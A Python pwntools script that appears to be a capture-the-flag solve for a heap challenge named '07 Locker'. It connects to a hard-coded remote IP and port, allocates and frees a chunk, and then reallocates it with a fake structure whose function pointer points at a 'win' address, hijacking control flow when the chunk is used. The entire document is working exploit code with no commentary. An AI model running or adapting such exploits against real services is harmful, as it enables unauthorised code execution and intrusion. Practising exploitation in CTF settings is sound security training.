#!/usr/bin/env python3
"""07 Locker: remote blind solve (pwntools + network only)."""
from pwn import *

HOST = '167.86.100.57'
PORT = 9007
WIN_REAL = 0x401396

context.arch = 'amd64'
context.log_level = 'error'

def menu(io, choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

io = remote(HOST, PORT)

menu(io, 1)
io.sendlineafter(b'#>', b'0')
io.sendlineafter(b'sz>', str(0x40).encode())
io.sendafter(b'data>', b'X' * 0x40)

menu(io, 2)
io.sendlineafter(b'#>', b'0')

menu(io, 5)
io.sendlineafter(b'#>', b'1')
io.sendlineafter(b'sz>', str(0x18).encode())
fake = p64(0) + p64(0) + p64(WIN_REAL)
io.sendafter(b'data>', fake.ljust(0x18, b'\x00'))

menu(io, 3)
io.sendlineafter(b'#>', b'0')
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
